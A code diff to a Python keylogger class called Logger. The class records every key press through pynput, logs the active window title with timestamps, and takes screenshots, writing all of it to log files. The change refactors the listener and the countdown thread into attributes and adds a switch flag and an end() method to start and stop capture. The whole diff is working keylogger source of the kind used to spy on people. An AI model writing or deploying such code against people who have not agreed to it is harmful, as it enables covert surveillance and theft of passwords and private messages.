@@ -1,3 +1,4 @@
+import sys
 import time
 from pynput.keyboard import Listener
 import pyautogui
@@ -56,13 +57,18 @@ class Logger:
         self.max_char = get_max_char()
         self.log_time = True
         self.running = False
+        self.listener = Listener(on_press=self.on_press)
+        self.count_down_thread = threading.Thread(target=self.count_down, args=(60,), daemon=True)
+        self.switch = False
+
         create_dir()
 
     def count_down(self, sec):
         last_window = ""
         file_name = f'{get_log_path()} apps.txt'
         screenshot()
-        while sec > 0:
+        sec = 60
+        while self.switch:
             active_window = GetWindowText(GetForegroundWindow())
             now = datetime.datetime.now().strftime('\n[%H:%M] ')
             if active_window != last_window:
@@ -79,6 +85,7 @@ class Logger:
                 lock.acquire()
                 self.log_time = True
                 lock.release()
+        return False
 
     def write_to_log(self, key):
         file_name = f'{get_log_path()} key.txt'
@@ -100,6 +107,8 @@ class Logger:
                 file.write(' ')
 
     def on_press(self, key):
+        if not self.switch:
+            return False
         self.write_to_log(key)
         try:
             print('alphanumeric key {0} pressed'.format(key.char))
@@ -110,10 +119,14 @@ class Logger:
     def keylogger(self):
         if not self.running:
             self.running = True
-            listener = Listener(on_press=self.on_press)
-            listener.start()
+            self.listener.start()
 
     def begin(self):
-        count_down_thread = threading.Thread(target=self.count_down, args=(60,), daemon=True)
-        count_down_thread.start()
+        self.switch = True
+        self.count_down_thread.start()
         self.keylogger()
+
+    def end(self):
+        lock.acquire()
+        self.switch = False
+        lock.release()
